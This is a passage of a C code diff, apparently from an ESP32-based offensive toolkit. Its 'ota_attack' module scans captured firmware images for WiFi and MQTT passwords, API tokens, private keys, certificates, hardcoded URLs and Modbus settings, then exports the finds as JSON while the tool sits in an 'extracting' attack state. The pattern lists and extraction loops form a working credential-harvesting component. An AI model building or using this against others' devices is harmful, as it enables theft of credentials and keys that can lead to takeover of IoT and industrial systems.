+        bool sensitive = (strstr(mqtt_patterns[i], "pass") != NULL ||
+                         strstr(mqtt_patterns[i], "PASS") != NULL);
+        scan_for_pattern(firmware_buffer, firmware_downloaded_size,
+                         mqtt_patterns[i], "mqtt_cred",
+                         sensitive ? 95 : 75, true);
+    }
+
+    /* ---- API key / token patterns ---- */
+    const char *api_patterns[] = {
+        "api_key", "API_KEY", "apikey", "ApiKey",
+        "access_token", "ACCESS_TOKEN", "auth_token", "AUTH_TOKEN",
+        "Bearer ", "Authorization:", "token=", "TOKEN=",
+        "private_token", "PRIVATE_TOKEN", "ghp_", "gho_",
+        "sk_live", "sk_test", "pk_live", "pk_test", NULL
+    };
+    for (int i = 0; api_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
+        scan_for_pattern(firmware_buffer, firmware_downloaded_size,
+                         api_patterns[i], "api_key", 95, true);
+    }
+
+    /* ---- Certificate / key patterns ---- */
+    const char *cert_patterns[] = {
+        "-----BEGIN RSA PRIVATE KEY-----",
+        "-----BEGIN EC PRIVATE KEY-----",
+        "-----BEGIN PRIVATE KEY-----",
+        "-----BEGIN CERTIFICATE-----",
+        "-----BEGIN PUBLIC KEY-----",
+        "MIIBIjANBgkq", /* Base64 start of RSA public key */
+        NULL
+    };
+    for (int i = 0; cert_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
+        scan_for_pattern(firmware_buffer, firmware_downloaded_size,
+                         cert_patterns[i], "certificate", 98, true);
+    }
+
+    /* ---- Hardcoded URL patterns ---- */
+    const char *url_patterns[] = {
+        "https://", "http://", "mqtt://", "mqtts://",
+        "wss://", "ws://", "ftp://",
+        NULL
+    };
+    for (int i = 0; url_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
+        /* URLs are not sensitive per se, scan them differently */
+        const char *proto = url_patterns[i];
+        int proto_len = (int)strlen(proto);
+        for (uint32_t j = 0; j < firmware_downloaded_size - 10 && fw_secret_count < OTA_MAX_FW_SECRETS; j++) {
+            if (memcmp(firmware_buffer + j, proto, proto_len) == 0) {
+                char url[256] = "";
+                int ui = 0;
+                uint32_t k = j;
+                while (k < firmware_downloaded_size && ui < 255 &&
+                       firmware_buffer[k] >= 0x20 && firmware_buffer[k] < 0x7F &&
+                       firmware_buffer[k] != '"' && firmware_buffer[k] != '\'' &&
+                       firmware_buffer[k] != ' ' && firmware_buffer[k] != '}') {
+                    url[ui++] = (char)firmware_buffer[k++];
+                }
+                url[ui] = '\0';
+                if (ui >= 12) {
+                    ota_fw_secret_t *secret = &fw_secrets[fw_secret_count];
+                    strncpy(secret->type, "url", OTA_MAX_SECRET_TYPE_LEN - 1);
+                    strncpy(secret->value, url, OTA_MAX_SECRET_VALUE_LEN - 1);
+                    strncpy(secret->context, url, OTA_MAX_SECRET_CONTEXT_LEN - 1);
+                    secret->context[OTA_MAX_SECRET_CONTEXT_LEN - 1] = '\0';
+                    secret->offset = j;
+                    secret->confidence = 60;
+                    fw_secret_count++;
+                }
+                j = k; /* Skip past this URL */
+            }
+        }
+    }
+
+    /* ---- Modbus config patterns ---- */
+    const char *modbus_patterns[] = {
+        "modbus", "MODBUS", "modbus_driver", "ModbusDriver",
+        "modbus_url", "MODBUS_URL", "driver_url", "DRIVER_URL",
+        NULL
+    };
+    for (int i = 0; modbus_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
+        scan_for_pattern(firmware_buffer, firmware_downloaded_size,
+                         modbus_patterns[i], "modbus_config", 70, true);
+    }
+
+    /* Update summary */
+    fw_analysis_summary.secrets_found = (uint32_t)fw_secret_count;
+    fw_analysis_summary.high_confidence_count = fw_high_confidence_count;
+
+    /* Set category flags */
+    for (int i = 0; i < fw_secret_count; i++) {
+        if (strcmp(fw_secrets[i].type, "wifi_cred") == 0) fw_analysis_summary.has_wifi_creds = true;
+        if (strcmp(fw_secrets[i].type, "mqtt_cred") == 0) fw_analysis_summary.has_mqtt_creds = true;
+        if (strcmp(fw_secrets[i].type, "api_key") == 0) fw_analysis_summary.has_api_keys = true;
+        if (strcmp(fw_secrets[i].type, "certificate") == 0) {
+            if (strstr(fw_secrets[i].context, "PRIVATE KEY")) fw_analysis_summary.has_private_keys = true;
+            else fw_analysis_summary.has_certificates = true;
+        }
+        if (strcmp(fw_secrets[i].type, "url") == 0) fw_analysis_summary.has_hardcoded_urls = true;
+        if (strcmp(fw_secrets[i].type, "modbus_config") == 0) fw_analysis_summary.has_modbus_config = true;
+    }
+
+    attack_state = OTA_STATE_FW_EXTRACTING;
+
+    ESP_LOGI(TAG, "FIRMWARE_ANALYZE: Complete - %d secrets found, %u high confidence",
+             fw_secret_count, (unsigned)fw_high_confidence_count);
+    ESP_LOGI(TAG, "  WiFi creds: %d, MQTT creds: %d, API keys: %d, Certs: %d, URLs: %d",
+             fw_analysis_summary.has_wifi_creds, fw_analysis_summary.has_mqtt_creds,
+             fw_analysis_summary.has_api_keys, fw_analysis_summary.has_certificates,
+             fw_analysis_summary.has_hardcoded_urls);
+
+    return fw_secret_count;
+}
+
+const char *ota_attack_get_fw_secrets_json(void)
+{
+    static char json_buf[16384];
+    cJSON *root = cJSON_CreateArray();
+
+    for (int i = 0; i < fw_secret_count; i++) {
+        cJSON *item = cJSON_CreateObject();
+        cJSON_AddStringToObject(item, "type", fw_secrets[i].type);
+        cJSON_AddStringToObject(item, "value", fw_secrets[i].value);
+        cJSON_AddStringToObject(item, "context", fw_secrets[i].context);
+        cJSON_AddNumberToObject(item, "offset", fw_secrets[i].offset);
+        cJSON_AddNumberToObject(item, "confidence", fw_secrets[i].confidence);
+        cJSON_AddItemToArray(root, item);
+    }
+
+    char *printed = cJSON_PrintUnformatted(root);
+    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
+    cJSON_Delete(root);
+    free(printed);
+    return json_buf;
+}
+
+void ota_attack_get_fw_analysis_summary(ota_fw_analysis_summary_t *out)
+{
+    if (out) {
+        *out = fw_analysis_summary;
+    }
+}
+
+const char *ota_attack_get_fw_analysis_summary_json(void)
+{
+    static char json_buf[2048];
+    cJSON *root = cJSON_CreateObject();
+    cJSON_AddNumberToObject(root, "firmware_size", fw_analysis_summary.firmware_size);
+    cJSON_AddNumberToObject(root, "secrets_found", fw_analysis_summary.secrets_found);
+    cJSON_AddNumberToObject(root, "high_confidence_count", fw_analysis_summary.high_confidence_count);
+    cJSON_AddBoolToObject(root, "has_wifi_creds", fw_analysis_summary.has_wifi_creds);
+    cJSON_AddBoolToObject(root, "has_mqtt_creds", fw_analysis_summary.has_mqtt_creds);
+    cJSON_AddBoolToObject(root, "has_api_keys", fw_analysis_summary.has_api_keys);
+    cJSON_AddBoolToObject(root, "has_certificates", fw_analysis_summary.has_certificates);
+    cJSON_AddBoolToObject(root, "has_private_keys", fw_analysis_summary.has_private_keys);
+    cJSON_AddBoolToObject(root, "has_hardcoded_urls", fw_analysis_summary.has_hardcoded_urls);
+    cJSON_AddBoolToObject(root, "has_modbus_config", fw_analysis_summary.has_modbus_config);
+
+    char *printed = cJSON_PrintUnformatted(root);
+    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "{}");
+    cJSON_Delete(root);
+    free(printed);
+    return json_buf;
+}
+
+uint32_t ota_attack_get_fw_secret_count(void)
+{
+    return (uint32_t)fw_secret_count;
+}
+
+uint32_t ota_attack_get_fw_high_confidence_count(void)
+{
+    return fw_high_confidence_count;
+}
+
+void ota_attack_clear_fw_secrets(void)
+{
+    fw_secret_count = 0;
+    fw_high_confidence_count = 0;
+    memset(fw_secrets, 0, sizeof(fw_secrets));
+    memset(&fw_analysis_summary, 0, sizeof(fw_analysis_summary));
 }
 
 
